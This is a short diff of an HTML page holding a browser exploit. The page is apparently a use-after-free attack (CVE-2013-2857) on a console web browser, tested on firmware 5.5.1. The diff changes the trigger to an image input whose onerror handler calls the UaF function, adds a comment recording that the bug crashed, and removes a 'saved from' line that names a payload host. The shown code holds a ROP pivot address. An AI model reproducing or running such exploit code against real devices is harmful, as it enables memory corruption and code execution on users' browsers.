@@ -1,6 +1,12 @@
 
-<!-- saved from url=(0032)http://loadiine.ovh/552/payload/ -->
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script>
+<html>
+<!--
+Tested on 5.5.1
+CVE-2013-2857
+Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
+Result: Bug is present, crash
+-->
+<script>
 function UaF(a){
     var pivotAdress             = 17489356;
     //5.5.2
@@ -74,4 +80,5 @@ function UaF(a){
 }
 </script>
 
-</head><body><input id="x" type="radio" onerror="UaF(this);" src=""></body></html>
+<input id="x" type="image" onerror="UaF(this);" src=""/>
+</html>
